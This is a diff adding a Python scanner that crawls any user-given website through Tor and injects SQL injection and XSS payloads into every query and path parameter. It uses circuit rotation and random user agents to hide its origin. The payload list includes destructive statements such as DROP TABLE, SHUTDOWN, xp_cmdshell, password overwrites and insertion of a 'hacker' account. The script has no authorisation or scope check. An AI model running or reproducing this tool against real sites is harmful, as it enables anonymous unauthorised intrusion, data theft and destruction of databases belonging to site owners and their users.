@@ -1,0 +1,361 @@
+import requests
+from bs4 import BeautifulSoup
+import threading
+import urllib.parse
+from collections import deque
+from urllib.parse import urlparse, parse_qs, urlencode
+import time
+import random
+import socks
+import socket
+from stem import Signal
+from stem.control import Controller
+import os
+
+# Configure Tor proxy
+TOR_PROXY = "socks5h://localhost:9050"  # Use "socks5h" for DNS resolution through Tor
+
+# Define vulnerability payloads
+PAYLOADS = {
+    "SQLi": [
+        # Basic SQLi payloads
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' OR 'a'='a",
+        "' OR 1=1#",
+        "' OR '1'='1' --",
+        "' OR '1'='1'#",
+        "' OR 1=1; --",
+        "' OR 1=1;#",
+        # Error-based SQLi
+        "' OR 1=CONVERT(int, (SELECT @@version)) --",
+        "' OR 1/0 --",  # Division by zero
+        "' OR @@version --",
+        "' OR 'x'='x' AND EXTRACTVALUE(1, concat(0x7e,(SELECT @@version))) --",
+        # Union-based SQLi
+        "' UNION SELECT null, null --",
+        "' UNION SELECT username, password FROM users --",
+        "' UNION ALL SELECT null, null, null --",
+        "' UNION SELECT 1, database(), version() --",
+        "' UNION SELECT 1, user(), @@datadir --",
+        "' ORDER BY 1 --",
+        "' UNION SELECT 1,2,3 --",
+        "' UNION SELECT 1, table_name, null FROM information_schema.tables --",
+        "' UNION SELECT 1, column_name, null FROM information_schema.columns --",
+        # Boolean-based Blind SQLi
+        "' AND 1=1 --",
+        "' AND 1=2 --",
+        "' AND substring(database(),1,1)='a' --",
+        "' AND (SELECT length(database()))=5 --",
+        "' AND ascii(substring((SELECT database()),1,1))=97 --",
+        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
+        "' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
+        # Time-based Blind SQLi
+        "' AND SLEEP(5) --",
+        "' AND 1=IF(2>1,SLEEP(5),0) --",
+        "' AND 1=IF(2<1,SLEEP(5),0) --",
+        "' OR IF(1=1,SLEEP(5),0) --",
+        "' AND BENCHMARK(1000000,MD5(1)) --",
+        "' AND (SELECT * FROM (SELECT SLEEP(5))a) --",
+        "' WAITFOR DELAY '0:0:5' --",  # MSSQL specific
+        "' AND pg_sleep(5) --",  # PostgreSQL specific
+        "' AND sleep(5)=0 --",  # MySQL specific
+        # More advanced SQLi payloads
+        "'; DROP TABLE users; --",
+        "'; SHUTDOWN; --",
+        "'; EXEC xp_cmdshell 'dir' --",  # MSSQL specific
+        "' OR EXISTS(SELECT * FROM users) --",
+        "' HAVING 1=1 --",
+        "' GROUP BY 1 --",
+        "' AND 1 in (SELECT @@version) --",
+        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+        "' AND SUBSTRING((SELECT version()),1,1)='5' --",
+        "' OR 1=(SELECT 1 FROM dual) --",  # Oracle specific
+        # Escaped and encoded variations
+        "'' OR ''1''=''1",
+        "'%20OR%201=1--",
+        "'+OR+1=1--",
+        "') OR ('1'='1",
+        "')) OR (('1'='1",
+        # Multi-statement attempts
+        "'; SELECT * FROM users; --",
+        "'; UPDATE users SET password='hacked'; --",
+        "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --",
+        # Additional database-specific payloads
+        "' OR sqlite_version() --",  # SQLite specific
+        "' AND 1=cast('1' as int) --",  # Type conversion errors
+        "' AND ROW_COUNT() > 0 --",  # MySQL specific
+        "' OR 1=DBMS_UTILITY.SQLID_TO_SQLHASH('test') --"  # Oracle specific
+    ],
+    "XSS": [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>"
+    ]
+}
+
+# List of UserAgent headers
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
+]
+
+# Threading settings
+MAX_THREADS = 3
+MAX_RETRIES = 3
+
+# Track tested URLs and parameters to avoid duplicates
+tested_urls = set()
+
+def get_random_user_agent():
+    """Return a random User-Agent string."""
+    return random.choice(USER_AGENTS)
+
+def get_tor_session():
+    """Create a requests session routed through Tor."""
+    session = requests.Session()
+    session.proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
+    return session
+
+def rotate_tor_circuit():
+    """Rotate Tor circuit to get a new IP address."""
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate()
+        controller.signal(Signal.NEWNYM)
+    print("[INFO] Rotated Tor circuit.")
+
+def save_urls_to_file(urls, website_name):
+    """Save URLs to a text file named after the website."""
+    filename = f"{website_name}_urls.txt"
+    with open(filename, 'w', encoding='utf-8') as f:
+        for url in urls:
+            f.write(f"{url}\n")
+    print(f"[INFO] Saved {len(urls)} URLs to {filename}")
+    return filename
+
+def load_urls_from_file(filename):
+    """Load URLs from a text file."""
+    if not os.path.exists(filename):
+        print(f"[ERROR] File {filename} not found!")
+        return []
+    with open(filename, 'r', encoding='utf-8') as f:
+        urls = [line.strip() for line in f if line.strip()]
+    print(f"[INFO] Loaded {len(urls)} URLs from {filename}")
+    return urls
+
+def crawl(start_url, max_depth=2):
+    """Crawl the website to find all internal links without recursion."""
+    visited = set()
+    queue = deque([(start_url, 0)])
+    links = []
+    session = get_tor_session()
+    
+    while queue:
+        url, depth = queue.popleft()
+        if url in visited or depth > max_depth:
+            continue
+        visited.add(url)
+        try:
+            headers = {"User-Agent": get_random_user_agent()}
+            response = session.get(url, headers=headers, timeout=30)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            for link in soup.find_all('a', href=True):
+                full_url = urllib.parse.urljoin(url, link['href'])
+                if full_url.startswith(start_url) and full_url not in visited:
+                    queue.append((full_url, depth + 1))
+                    links.append(full_url)
+                    print(f"[DEBUG] Found link: {full_url}")
+        except requests.RequestException as e:
+            print(f"[ERROR] Failed to crawl {url}: {e}")
+    return links
+
+def get_baseline_response(url, session, headers):
+    """Fetch the original response for comparison."""
+    try:
+        response = session.get(url, headers=headers, timeout=30)
+        return {
+            "status_code": response.status_code,
+            "content": response.text,
+            "length": len(response.text)
+        }
+    except requests.RequestException as e:
+        print(f"[ERROR] Failed to get baseline for {url}: {e}")
+        return None
+
+def is_vulnerable(baseline, response, elapsed_time, payload):
+    """Check if the response indicates an SQLi vulnerability."""
+    # Error-based detection
+    errors = {
+        "sql syntax", "mysql_fetch", "syntax error", "unexpected token",
+        "error in your sql", "warning: mysql"
+    }
+    content = response.text.lower()
+    if any(error in content for error in errors):
+        return "error-based"
+
+    # Time-based detection
+    if "SLEEP" in payload and elapsed_time > 5:
+        return "time-based"
+
+    # Boolean/Union-based detection (content change)
+    if baseline and response.status_code == 200:
+        baseline_len = baseline["length"]
+        response_len = len(response.text)
+        # Significant content increase or difference suggests SQLi
+        if response_len > baseline_len * 1.5 or (response_len > baseline_len and "SELECT" in payload.upper()):
+            return "boolean/union-based"
+
+    return None
+
+def test_sqli(url):
+    """Test SQL Injection in query parameters and path parameters."""
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+    session = get_tor_session()
+    headers = {"User-Agent": get_random_user_agent()}
+
+    # Get baseline response for comparison
+    baseline = get_baseline_response(url, session, headers) if query_params else None
+
+    if query_params:
+        for param in query_params:
+            for payload in PAYLOADS["SQLi"]:
+                test_params = query_params.copy()
+                test_params[param] = payload
+                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
+                if test_url in tested_urls:
+                    continue
+                tested_urls.add(test_url)
+                for attempt in range(MAX_RETRIES):
+                    try:
+                        start_time = time.time()
+                        response = session.get(test_url, headers=headers, timeout=30)
+                        elapsed_time = time.time() - start_time
+                        vuln_type = is_vulnerable(baseline, response, elapsed_time, payload)
+                        if vuln_type:
+                            print(f"[+] {vuln_type.capitalize()} SQLi vulnerability found in {param} at {test_url}")
+                            break
+                    except requests.RequestException as e:
+                        print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
+                        if attempt < MAX_RETRIES - 1:
+                            time.sleep(random.uniform(1, 5))
+                        else:
+                            print(f"[ERROR] Max retries reached for {test_url}")
+    else:
+        for payload in PAYLOADS["SQLi"]:
+            test_url = f"{url}/{payload}"
+            if test_url in tested_urls:
+                continue
+            tested_urls.add(test_url)
+            for attempt in range(MAX_RETRIES):
+                try:
+                    start_time = time.time()
+                    response = session.get(test_url, headers=headers, timeout=30)
+                    elapsed_time = time.time() - start_time
+                    vuln_type = is_vulnerable(None, response, elapsed_time, payload)
+                    if vuln_type:
+                        print(f"[+] {vuln_type.capitalize()} SQLi vulnerability found in path at {test_url}")
+                        break
+                except requests.RequestException as e:
+                    print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
+                    if attempt < MAX_RETRIES - 1:
+                        time.sleep(random.uniform(1, 5))
+                    else:
+                        print(f"[ERROR] Max retries reached for {test_url}")
+
+def test_xss(url):
+    """Test XSS in query parameters."""
+    parsed_url = urlparse(url)
+    query_params = parse_qs(parsed_url.query)
+    session = get_tor_session()
+    
+    if query_params:
+        for param in query_params:
+            for payload in PAYLOADS["XSS"]:
+                test_params = query_params.copy()
+                test_params[param] = payload
+                test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
+                if test_url in tested_urls:
+                    continue
+                tested_urls.add(test_url)
+                for attempt in range(MAX_RETRIES):
+                    try:
+                        headers = {"User-Agent": get_random_user_agent()}
+                        response = session.get(test_url, headers=headers, timeout=30)
+                        if payload in response.text:
+                            print(f"[+] XSS vulnerability found in {param} at {test_url}")
+                            break
+                    except requests.RequestException as e:
+                        print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
+                        if attempt < MAX_RETRIES - 1:
+                            time.sleep(random.uniform(1, 5))
+                        else:
+                            print(f"[ERROR] Max retries reached for {test_url}")
+    else:
+        for payload in PAYLOADS["XSS"]:
+            test_url = f"{url}/{payload}"
+            if test_url in tested_urls:
+                continue
+            tested_urls.add(test_url)
+            for attempt in range(MAX_RETRIES):
+                try:
+                    headers = {"User-Agent": get_random_user_agent()}
+                    response = session.get(test_url, headers=headers, timeout=30)
+                    if payload in response.text:
+                        print(f"[+] XSS vulnerability found in path at {test_url}")
+                        break
+                except requests.RequestException as e:
+                    print(f"[ERROR] Attempt {attempt + 1} failed for {test_url}: {e}")
+                    if attempt < MAX_RETRIES - 1:
+                        time.sleep(random.uniform(1, 5))
+                    else:
+                        print(f"[ERROR] Max retries reached for {test_url}")
+
+def test_links(links):
+    """Test vulnerabilities in all crawled links."""
+    threads = []
+    for url in links:
+        if threading.active_count() >= MAX_THREADS:
+            time.sleep(random.uniform(1, 5))
+        t1 = threading.Thread(target=test_sqli, args=(url,))
+        t2 = threading.Thread(target=test_xss, args=(url,))
+        threads.append(t1)
+        threads.append(t2)
+        t1.start()
+        t2.start()
+        time.sleep(random.uniform(1, 5))
+    for t in threads:
+        t.join()
+
+def main():
+    """Main function to handle user input and start the scan."""
+    print("Choose an option:")
+    print("1. Start a new scan")
+    print("2. Load URLs from a text file")
+    choice = input("Enter your choice (1 or 2): ").strip()
+
+    if choice == "1":
+        url = input("Enter the website URL to scan (e.g., http://example.com): ").strip()
+        if not url.startswith("http://") and not url.startswith("https://"):
+            url = "http://" + url
+        website_name = urlparse(url).netloc.replace('.', '_')
+        print(f"[*] Starting new scan for {url}")
+        links = crawl(url)
+        print(f"[*] Found {len(links)} links")
+        if links:
+            save_urls_to_file(links, website_name)
+        test_links(links)
+    elif choice == "2":
+        filename = input("Enter the path to the text file containing URLs: ").strip()
+        links = load_urls_from_file(filename)
+        if links:
+            print(f"[*] Testing {len(links)} loaded links")
+            test_links(links)
+        else:
+            print("[ERROR] No links to test. Please check the file or start a new scan with option 1.")
+    else:
+        print("[ERROR] Invalid choice! Please select 1 or 2.")
+
+if __name__ == "__main__":
+    main()
